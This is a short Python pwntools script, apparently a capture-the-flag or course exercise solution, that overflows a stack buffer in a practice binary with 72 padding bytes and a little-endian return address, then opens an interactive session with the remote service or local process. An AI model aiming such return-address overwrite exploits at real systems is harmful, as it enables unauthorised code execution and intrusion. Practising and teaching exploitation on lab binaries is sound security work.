from pwn import *
def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    p.recvuntil(b'This is almost exactly the same as jump...').decode('utf-8').strip()
    payload = b"A" * 72 + b"\x96\x11\x40\x00\x00\x00\x00\x00"  # Address in little-endian format
    print(f"[*] Sending payload: {payload}")
    p.sendline(payload)
    p.interactive()


# Example usage
interact_with_process('', '6447.lol', 18496)
# interact_with_process('../w1/too-slow')
